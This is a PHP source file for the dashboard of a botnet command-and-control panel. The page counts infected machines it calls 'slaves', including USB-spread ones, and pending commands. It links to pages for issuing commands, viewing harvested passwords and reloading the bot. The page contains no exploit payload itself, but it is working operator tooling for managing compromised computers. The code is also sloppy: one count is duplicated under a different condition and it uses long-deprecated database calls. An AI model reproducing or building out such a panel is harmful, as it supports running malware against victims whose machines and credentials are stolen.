<?
session_start();
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
if($_SESSION['botnet_session'] != $security_token) 
{
echo "<script>window.location='../index.php';</script>";
}
?>
<html>
<head>
<title>Mustafa Riadh</title>
<link rel="stylesheet" type="text/css" href="../style/plugins.css">
<link rel="stylesheet" type="text/css" href="style/main.css">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
<?
if(file_exists("../mustafa.php")) 
{
$checker = fopen("../mustafa.php","r");
$copyrights = fgets($checker);
if ($copyrights != "mustafa Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
</head>
<body>
<div id="navbar">
<img src="images/mustafa.jpg" width="60" class="image">
<a class="username"><? echo($usernamec) ?></a>
<br><br><br>
<div id="navbar-menu">
<hr class="navbar-hr" color="#3ab4a6">
<a href="index.php" style="text-decoration: none;"><font class="navbar-button-active">DASHBOARD</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="show_slaves.php" style="text-decoration: none;"><font class="navbar-button">SLAVES LIST</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="commands.php" style="text-decoration: none;"><font class="navbar-button">COMMANDS</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="passwords.php" style="text-decoration: none;"><font class="navbar-button">PASSWORDS</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="#reload" style="text-decoration: none;"><font class="navbar-button">RELOAD BOT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="help.php" style="text-decoration: none;"><font class="navbar-button">HELP PAGE</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="about.php" style="text-decoration: none;"><font class="navbar-button">ABOUT BOT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="logout.php" style="text-decoration: none;"><font class="navbar-button">LOGOUT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
</div>
</div>
<div id="greenbox">
<?
$get_slaves = mysql_query("SELECT * FROM slaves", $connect);
$slaves_number = mysql_num_rows($get_slaves);
?>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>SLAVES</font>
<br><br>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
</div>
<div id="greenboxtwo">
<?
$get_slaves = mysql_query("SELECT * FROM slaves WHERE usb='Y'", $connect);
$slaves_number = mysql_num_rows($get_slaves);
?>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>USB SLAVES</font>
<br><br>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
</div>
<div id="greenboxthree">
<?
$get_slaves = mysql_query("SELECT * FROM slaves WHERE usb='true'", $connect);
$slaves_number = mysql_num_rows($get_slaves);
?>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>USB SLAVES</font>
<br><br>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
</div>
<div id="greenboxthree">
<?
$get_slaves = mysql_query("SELECT * FROM commands WHERE status='pending'", $connect);
$slaves_number = mysql_num_rows($get_slaves);
?>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>COMMANDS</font>
<br><br>
<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
</div>
<center>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<font size="30" color="#FF0000" face="Lobster">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mustafa Riadh Ketab</font>
</center>
</body>
</html>